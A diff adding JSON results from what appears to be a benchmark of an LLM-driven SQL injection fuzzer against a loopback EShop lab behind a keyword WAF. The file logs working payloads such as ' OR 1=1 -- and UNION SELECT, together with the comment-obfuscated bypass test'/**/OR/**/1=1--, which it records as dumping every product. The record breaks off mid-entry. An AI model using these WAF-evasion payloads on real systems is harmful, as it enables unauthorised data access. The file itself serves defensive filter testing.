@@ -1,0 +1,1279 @@
+{
+  "run_id": "89267dc3-c4b3-4093-a7c0-59148994feb4",
+  "created_at_utc": "2026-10-25T05:12:48.166640+00:00",
+  "config": {
+    "provider": "openai",
+    "model": "qwen/qwen3.8-27b",
+    "base_url": "https://api.groq.com/openai/v1",
+    "temperature": 0.0,
+    "max_completion_tokens": 1200,
+    "timeout_seconds": 30.0,
+    "group_approved": true
+  },
+  "target": "http://127.0.0.1:52684",
+  "budget": 50,
+  "max_feedback_ai_calls_per_run": 10,
+  "is_replay": false,
+  "oracle": "proposed_sqlite_differential_v1",
+  "oracle_review": "pending_group_review",
+  "sut_commit": "61e87bc3b272a55cf1b9366762fad1a0ed034212",
+  "source_hashes": {
+    "ai/A2_fuzzer_benchmark/live.py": "25580d590e02cbee7ddfa538ae7f0107de29035c7b1e3d7ac91086ce6f31c365",
+    "ai/A2_fuzzer_benchmark/offline.py": "e25f7acb9d3be5341722f224f5007d8a5a6395da01203ec62e1ef0a552344a9f",
+    "ai/A3a_ai_config/client.py": "1f7c43674a44b7b68a84da9af2c17c6cdfbcaecf268957708507d9d89ca06fd8",
+    "ai/A3a_ai_config/contracts.py": "e15246913c55e40380db818809d64816009417a9b2b07108d73e46ddba609d14",
+    "backend/server_fuzzer_lab.js": "cda8e33137df5eca7c404e58c85781bbd4673d3d7f26427114214dc7e78c7e48",
+    "backend/waf_middleware.js": "1aeee59f342d78ec9984ff6276aa880b29dad310e4b7102cb2848db40cc51e38",
+    "backend/database.js": "50012f35c2cf0776dd837482d76adf701f0ee40cdcb9d80143278fccde034717"
+  },
+  "prompt": "Bạn gợi ý đúng một input thử nghiệm không phá hủy cho EShop lab\nloopback được phép. Chỉ xử lý SQLi/XSS. Không thu thập mật khẩu/token, không xóa/sửa\ndữ liệu, không gây DoS, không gửi dữ liệu ra ngoài.\nChỉ trả về giá trị tham số thuần túy (tuyệt đối KHÔNG kèm tên tham số như \"search=\").\nKhi payload trước bị WAF chặn (HTTP 403 / blocked_keyword), hãy phân tích từ khóa bị chặn\nvà đề xuất kỹ thuật biến đổi tương đương ngữ nghĩa (như dùng inline comment /**/ thay khoảng trắng,\ndấu ngoặc đơn hoặc toán tử tương đương) để kiểm tra tính vững chắc của bộ lọc.\nChỉ trả should_stop=true khi ngân sách thử nghiệm đã hết hoặc gặp lỗi hệ thống nghiêm trọng.\nreason bằng tiếng Việt. Trả đúng JSON schema được yêu cầu.\n",
+  "lab_context": {
+    "scope": "Disposable, seeded EShop SQLite SQLi lab; read-only product search only",
+    "query": "SELECT * FROM products WHERE name LIKE '%{search}%'",
+    "method": "GET",
+    "parameter": "search",
+    "oracle": "Observed product IDs equal vulnerable query and differ from parameterized query",
+    "feedback": "403 blocked_keyword reports the matching literal substring; WAF stays enabled"
+  },
+  "status": "completed",
+  "rows": [
+    {
+      "branch": "wordlist_static",
+      "mode": "offline",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 29.348,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "offline",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 3.602,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "offline",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_sql_effect",
+            "observed_ids": [],
+            "parameterized_ids": [],
+            "vulnerable_ids": []
+          },
+          "bypass": false,
+          "latency_ms": 4.571,
+          "response_sha256": "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945",
+          "mode": "offline",
+          "blocked_keyword": null
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' or 'a'='a",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 20.628,
+          "response_sha256": "591449c980da097c2be77e50decdfd9ea1ebd064b99fddc96ceba736a772023c",
+          "mode": "offline",
+          "blocked_keyword": " or "
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' ORDER BY 1--+",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": true,
+            "reason": "sql_effect_verified",
+            "observed_ids": [
+              5
+            ],
+            "parameterized_ids": [],
+            "vulnerable_ids": [
+              5
+            ]
+          },
+          "bypass": true,
+          "latency_ms": 17.797,
+          "response_sha256": "74638c8de315b77a9afd217983c6f2264bda603a5d7a16ab356efe45557bafcf",
+          "mode": "offline",
+          "blocked_keyword": null
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 5,
+      "ai_api_requests": 0,
+      "stop_reason": "success",
+      "total_sut_requests": 9,
+      "request_to_first_success": 5,
+      "bypass": true,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_049b9ad950e242e8a38800a84b659eb9",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 1,
+      "api_calls": [],
+      "suggestions": []
+    },
+    {
+      "branch": "llm_static",
+      "mode": "live_generated_static",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 11.62,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' UNION SELECT 1,2,3--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 27.225,
+          "response_sha256": "c41e4b299052e9f2ca32b63d0f51afe8f6665c2687c9a97c0bd4911efc47748f",
+          "mode": "live_generated_static",
+          "blocked_keyword": " UNION "
+        },
+        {
+          "attempt_no": 3,
+          "payload": "' OR 1=1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 12.619,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' AND 1=1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 2.268,
+          "response_sha256": "8396b403b34109bfc8041435fe63aee383f8b2e824e6442e872b82c2f6ad4350",
+          "mode": "live_generated_static",
+          "blocked_keyword": " AND "
+        },
+        {
+          "attempt_no": 5,
+          "payload": "' OR ''='",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 28.485,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 6,
+          "payload": "' UNION SELECT NULL--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 25.095,
+          "response_sha256": "c41e4b299052e9f2ca32b63d0f51afe8f6665c2687c9a97c0bd4911efc47748f",
+          "mode": "live_generated_static",
+          "blocked_keyword": " UNION "
+        },
+        {
+          "attempt_no": 7,
+          "payload": "' OR 1=1 LIMIT 1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 24.542,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 7,
+      "ai_api_requests": 0,
+      "stop_reason": "source_exhausted",
+      "total_sut_requests": 11,
+      "request_to_first_success": null,
+      "bypass": false,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_97ed234ffc80488b9725192d3c6e7bf8",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 1,
+      "api_calls": [],
+      "suggestions": []
+    },
+    {
+      "branch": "llm_feedback",
+      "mode": "live",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "test'/**/OR/**/1=1--",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": true,
+            "reason": "sql_effect_verified",
+            "observed_ids": [
+              1,
+              2,
+              3,
+              4,
+              5
+            ],
+            "parameterized_ids": [],
+            "vulnerable_ids": [
+              1,
+              2,
+              3,
+              4,
+              5
+            ]
+          },
+          "bypass": true,
+          "latency_ms": 36.577,
+          "response_sha256": "55f8455f177bb2c48db629f7a6b148a0f1996cb9d2481569cb6bfcc2e85c0e1a",
+          "mode": "live",
+          "blocked_keyword": null
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 1,
+      "ai_api_requests": 1,
+      "stop_reason": "success",
+      "total_sut_requests": 5,
+      "request_to_first_success": 1,
+      "bypass": true,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_5fa49779727841ceab84eda46a2e2124",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 1,
+      "api_calls": [
+        {
+          "status": "success",
+          "usage": {
+            "completion_tokens": 58,
+            "prompt_tokens": 326,
+            "total_tokens": 384,
+            "completion_tokens_details": null,
+            "prompt_tokens_details": null,
+            "queue_time": 0.054230851,
+            "prompt_time": 0.022098108,
+            "completion_time": 0.117213787,
+            "total_time": 0.139311895
+          },
+          "response_id": "chatcmpl-ecbc42d5-9b2f-4d74-ba06-fa78f03237dc",
+          "model": "qwen/qwen3.8-27b",
+          "latency_ms": 469.708
+        }
+      ],
+      "suggestions": [
+        {
+          "payload": "test'/**/OR/**/1=1--",
+          "reason": "Thử nghiệm SQLi cơ bản với kỹ thuật inline comment để vượt qua WAF chặn khoảng trắng, kiểm tra tính vững chắc của bộ lọc.",
+          "should_stop": false
+        }
+      ]
+    },
+    {
+      "branch": "llm_static",
+      "mode": "live_generated_static",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 32.516,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' UNION SELECT 1,2,3--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 12.111,
+          "response_sha256": "c41e4b299052e9f2ca32b63d0f51afe8f6665c2687c9a97c0bd4911efc47748f",
+          "mode": "live_generated_static",
+          "blocked_keyword": " UNION "
+        },
+        {
+          "attempt_no": 3,
+          "payload": "' OR 1=1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 5.481,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' AND 1=1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 4.785,
+          "response_sha256": "8396b403b34109bfc8041435fe63aee383f8b2e824e6442e872b82c2f6ad4350",
+          "mode": "live_generated_static",
+          "blocked_keyword": " AND "
+        },
+        {
+          "attempt_no": 5,
+          "payload": "' OR ''='",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 2.226,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 6,
+          "payload": "' UNION SELECT NULL--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 25.615,
+          "response_sha256": "c41e4b299052e9f2ca32b63d0f51afe8f6665c2687c9a97c0bd4911efc47748f",
+          "mode": "live_generated_static",
+          "blocked_keyword": " UNION "
+        },
+        {
+          "attempt_no": 7,
+          "payload": "' OR 1=1 LIMIT 1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 28.013,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 7,
+      "ai_api_requests": 0,
+      "stop_reason": "source_exhausted",
+      "total_sut_requests": 11,
+      "request_to_first_success": null,
+      "bypass": false,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_130f934a027947dead825464ee0014ca",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 2,
+      "api_calls": [],
+      "suggestions": []
+    },
+    {
+      "branch": "llm_feedback",
+      "mode": "live",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "test'/**/OR/**/1=1--",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": true,
+            "reason": "sql_effect_verified",
+            "observed_ids": [
+              1,
+              2,
+              3,
+              4,
+              5
+            ],
+            "parameterized_ids": [],
+            "vulnerable_ids": [
+              1,
+              2,
+              3,
+              4,
+              5
+            ]
+          },
+          "bypass": true,
+          "latency_ms": 11.333,
+          "response_sha256": "55f8455f177bb2c48db629f7a6b148a0f1996cb9d2481569cb6bfcc2e85c0e1a",
+          "mode": "live",
+          "blocked_keyword": null
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 1,
+      "ai_api_requests": 1,
+      "stop_reason": "success",
+      "total_sut_requests": 5,
+      "request_to_first_success": 1,
+      "bypass": true,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_957d0cea1f6e499f8a06e3425625d2b3",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 2,
+      "api_calls": [
+        {
+          "status": "success",
+          "usage": {
+            "completion_tokens": 58,
+            "prompt_tokens": 326,
+            "total_tokens": 384,
+            "completion_tokens_details": null,
+            "prompt_tokens_details": null,
+            "queue_time": 0.058077747,
+            "prompt_time": 0.022847711,
+            "completion_time": 0.116513591,
+            "total_time": 0.139361302
+          },
+          "response_id": "chatcmpl-b0632eaf-8c91-467e-9901-947fbe86b16f",
+          "model": "qwen/qwen3.8-27b",
+          "latency_ms": 496.869
+        }
+      ],
+      "suggestions": [
+        {
+          "payload": "test'/**/OR/**/1=1--",
+          "reason": "Thử nghiệm SQLi cơ bản với kỹ thuật inline comment để vượt qua WAF chặn khoảng trắng, kiểm tra tính vững chắc của bộ lọc.",
+          "should_stop": false
+        }
+      ]
+    },
+    {
+      "branch": "wordlist_static",
+      "mode": "offline",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 11.129,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "offline",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 15.936,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "offline",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_sql_effect",
+            "observed_ids": [],
+            "parameterized_ids": [],
+            "vulnerable_ids": []
+          },
+          "bypass": false,
+          "latency_ms": 28.01,
+          "response_sha256": "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945",
+          "mode": "offline",
+          "blocked_keyword": null
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' or 'a'='a",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 6.996,
+          "response_sha256": "591449c980da097c2be77e50decdfd9ea1ebd064b99fddc96ceba736a772023c",
+          "mode": "offline",
+          "blocked_keyword": " or "
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' ORDER BY 1--+",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": true,
+            "reason": "sql_effect_verified",
+            "observed_ids": [
+              5
+            ],
+            "parameterized_ids": [],
+            "vulnerable_ids": [
+              5
+            ]
+          },
+          "bypass": true,
+          "latency_ms": 25.092,
+          "response_sha256": "74638c8de315b77a9afd217983c6f2264bda603a5d7a16ab356efe45557bafcf",
+          "mode": "offline",
+          "blocked_keyword": null
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 5,
+      "ai_api_requests": 0,
+      "stop_reason": "success",
+      "total_sut_requests": 9,
+      "request_to_first_success": 5,
+      "bypass": true,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_2d245097001445f9a9299e790c1a2e68",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 2,
+      "api_calls": [],
+      "suggestions": []
+    },
+    {
+      "branch": "llm_feedback",
+      "mode": "live",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "test'/**/OR/**/1=1--",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": true,
+            "reason": "sql_effect_verified",
+            "observed_ids": [
+              1,
+              2,
+              3,
+              4,
+              5
+            ],
+            "parameterized_ids": [],
+            "vulnerable_ids": [
+              1,
+              2,
+              3,
+              4,
+              5
+            ]
+          },
+          "bypass": true,
+          "latency_ms": 19.956,
+          "response_sha256": "55f8455f177bb2c48db629f7a6b148a0f1996cb9d2481569cb6bfcc2e85c0e1a",
+          "mode": "live",
+          "blocked_keyword": null
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 1,
+      "ai_api_requests": 1,
+      "stop_reason": "success",
+      "total_sut_requests": 5,
+      "request_to_first_success": 1,
+      "bypass": true,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_d72d755661e94686891614be1c0001a5",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 3,
+      "api_calls": [
+        {
+          "status": "success",
+          "usage": {
+            "completion_tokens": 58,
+            "prompt_tokens": 326,
+            "total_tokens": 384,
+            "completion_tokens_details": null,
+            "prompt_tokens_details": null,
+            "queue_time": 0.053039395,
+            "prompt_time": 0.022250405,
+            "completion_time": 0.11999761,
+            "total_time": 0.142248015
+          },
+          "response_id": "chatcmpl-4933d69e-66a6-4c1d-98e7-ab4f076c9479",
+          "model": "qwen/qwen3.8-27b",
+          "latency_ms": 516.349
+        }
+      ],
+      "suggestions": [
+        {
+          "payload": "test'/**/OR/**/1=1--",
+          "reason": "Thử nghiệm SQLi cơ bản với kỹ thuật inline comment để vượt qua WAF chặn khoảng trắng, kiểm tra tính vững chắc của bộ lọc.",
+          "should_stop": false
+        }
+      ]
+    },
+    {
+      "branch": "wordlist_static",
+      "mode": "offline",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR 1=1 --",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 8.426,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "offline",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 7.338,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "offline",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 3,
+          "payload": "admin' --",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_sql_effect",
+            "observed_ids": [],
+            "parameterized_ids": [],
+            "vulnerable_ids": []
+          },
+          "bypass": false,
+          "latency_ms": 32.244,
+          "response_sha256": "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945",
+          "mode": "offline",
+          "blocked_keyword": null
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' or 'a'='a",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 16.78,
+          "response_sha256": "591449c980da097c2be77e50decdfd9ea1ebd064b99fddc96ceba736a772023c",
+          "mode": "offline",
+          "blocked_keyword": " or "
+        },
+        {
+          "attempt_no": 5,
+          "payload": "1' ORDER BY 1--+",
+          "response_code": 200,
+          "checkpoint": {
+            "bypass": true,
+            "reason": "sql_effect_verified",
+            "observed_ids": [
+              5
+            ],
+            "parameterized_ids": [],
+            "vulnerable_ids": [
+              5
+            ]
+          },
+          "bypass": true,
+          "latency_ms": 7.869,
+          "response_sha256": "74638c8de315b77a9afd217983c6f2264bda603a5d7a16ab356efe45557bafcf",
+          "mode": "offline",
+          "blocked_keyword": null
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 5,
+      "ai_api_requests": 0,
+      "stop_reason": "success",
+      "total_sut_requests": 9,
+      "request_to_first_success": 5,
+      "bypass": true,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_ff6fc35b759345389c402e735c060af2",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 3,
+      "api_calls": [],
+      "suggestions": []
+    },
+    {
+      "branch": "llm_static",
+      "mode": "live_generated_static",
+      "budget": 50,
+      "attempts": [
+        {
+          "attempt_no": 1,
+          "payload": "' OR '1'='1",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 1.742,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 2,
+          "payload": "' UNION SELECT 1,2,3--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 2.328,
+          "response_sha256": "c41e4b299052e9f2ca32b63d0f51afe8f6665c2687c9a97c0bd4911efc47748f",
+          "mode": "live_generated_static",
+          "blocked_keyword": " UNION "
+        },
+        {
+          "attempt_no": 3,
+          "payload": "' OR 1=1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 2.526,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 4,
+          "payload": "' AND 1=1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 23.858,
+          "response_sha256": "8396b403b34109bfc8041435fe63aee383f8b2e824e6442e872b82c2f6ad4350",
+          "mode": "live_generated_static",
+          "blocked_keyword": " AND "
+        },
+        {
+          "attempt_no": 5,
+          "payload": "' OR ''='",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 27.646,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        },
+        {
+          "attempt_no": 6,
+          "payload": "' UNION SELECT NULL--",
+          "response_code": 403,
+          "checkpoint": {
